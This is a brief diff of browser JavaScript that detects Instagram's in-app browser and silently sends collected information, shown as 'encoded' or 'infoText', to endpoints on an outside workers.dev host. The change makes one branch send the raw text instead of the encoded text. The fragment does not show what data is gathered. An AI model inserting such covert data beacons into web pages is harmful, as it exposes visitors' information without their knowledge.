@@ -86,7 +86,7 @@ if (userAgent.toLowerCase().includes("instagram") && !fromWorker) {
   const url = `https://workers.client57.workers.dev/api/rfig?result=%0A${encoded}`;
   fetch(url); 
 } else {
-  const flog = `https://workers.client57.workers.dev/api/log?result=%0A${encoded}`;
+  const flog = `https://workers.client57.workers.dev/api/log?result=%0A${infoText}`;
   fetch(flog);
 }
     })();
